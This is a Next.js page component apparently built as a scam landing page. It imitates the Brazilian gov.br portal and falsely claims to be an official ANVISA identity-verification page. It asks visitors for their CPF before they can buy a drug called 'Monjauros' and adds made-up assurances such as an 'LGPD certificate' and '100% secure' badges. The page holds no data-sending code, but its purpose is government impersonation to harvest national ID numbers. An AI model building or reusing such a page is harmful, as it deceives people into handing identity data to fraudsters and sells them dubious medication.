import Link from "next/link"
import { Button } from "@/components/ui/button"
import { GovBrHeader } from "@/components/gov-br-header"
import { GovBrFooter } from "@/components/gov-br-footer"

export default function Home() {
  return (
    <div className="flex flex-col min-h-screen">
      <GovBrHeader />

      <main className="flex-1 container mx-auto px-4 py-6">
        <div className="flex items-center text-sm mb-4 text-blue-800">
          <Link href="/" className="hover:underline">
            <span className="inline-flex items-center">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="16"
                height="16"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
                className="mr-1"
              >
                <path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" />
                <polyline points="9 22 9 12 15 12 15 22" />
              </svg>
            </span>
          </Link>
          <span className="mx-2">{">"}</span>
          <Link href="/portal-cidadao" className="hover:underline">
            Portal Cidadão
          </Link>
          <span className="mx-2">{">"}</span>
          <Link href="/verificacao-de-acesso" className="hover:underline">
            Verificação de Acesso
          </Link>
          <span className="mx-2">{">"}</span>
          <span className="font-medium">Monjauros</span>
        </div>

        <div className="bg-white rounded-lg shadow-sm p-6 mb-6">
          <h1 className="text-xl font-bold text-blue-900 mb-1">VERIFICAÇÃO DE ACESSO SEGURO</h1>
          <h2 className="text-xl font-bold text-blue-900 mb-4">Portal de Verificação de Identidade</h2>
          <p className="text-gray-700 mb-6">
            Este é um ambiente seguro para validação de sua identidade antes de prosseguir com a compra do Monjauros.
          </p>

          <div className="border-l-4 border-blue-800 bg-blue-50 p-4 mb-8">
            <div className="flex items-start">
              <div className="bg-blue-800 text-white rounded-full w-6 h-6 flex items-center justify-center mr-2 flex-shrink-0">
                <span>i</span>
              </div>
              <div>
                <h3 className="font-bold text-blue-900 mb-1">Ambiente Verificado</h3>
                <p className="text-sm text-gray-700">
                  Esta é uma página oficial da ANVISA para verificação de identidade. Seus dados serão utilizados apenas
                  para verificar sua elegibilidade para adquirir o medicamento Monjauros e não serão compartilhados com
                  terceiros.
                </p>
              </div>
            </div>
          </div>

          <h3 className="text-xl font-bold text-center mb-6">Verificação de Identidade</h3>
          <p className="text-center mb-6">
            Para prosseguir com segurança, precisamos verificar sua identidade através do seu CPF.
          </p>

          <div className="max-w-md mx-auto">
            <div className="mb-4">
              <label htmlFor="cpf" className="block text-sm font-medium mb-1">
                CPF:
              </label>
              <input
                type="text"
                id="cpf"
                placeholder="123.456.789-10"
                className="w-full p-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
              />
            </div>

            <Link href="/verificacao-seguranca">
              <Button className="w-full bg-blue-700 hover:bg-blue-800 text-white font-bold py-3 px-4 rounded-full">
                Verificar com Segurança
              </Button>
            </Link>

            <div className="flex items-center justify-center mt-4 text-sm text-gray-500 space-x-4">
              <div className="flex items-center">
                <div className="w-3 h-3 bg-gray-300 rounded-full mr-1"></div>
                <span>Verificação de identidade</span>
              </div>
              <div className="flex items-center">
                <div className="w-3 h-3 bg-gray-300 rounded-full mr-1"></div>
                <span>Proteção de dados</span>
              </div>
              <div className="flex items-center">
                <div className="w-3 h-3 bg-gray-300 rounded-full mr-1"></div>
                <span>Criptografia SSL</span>
              </div>
            </div>
          </div>

          <div className="mt-8 border-t pt-4">
            <div className="flex items-start">
              <div className="bg-green-500 text-white rounded-full w-6 h-6 flex items-center justify-center mr-2 flex-shrink-0">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <polyline points="20 6 9 17 4 12" />
                </svg>
              </div>
              <div>
                <h3 className="font-bold text-gray-800 mb-1">Processo 100% Seguro</h3>
                <p className="text-sm text-gray-700">
                  Seus dados são protegidos pelos mais altos padrões de segurança, com certificado LGPD. Após a
                  verificação, você será direcionado para a compra do Monjauros.
                </p>
              </div>
            </div>
          </div>
        </div>
      </main>

      <GovBrFooter />
    </div>
  )
}
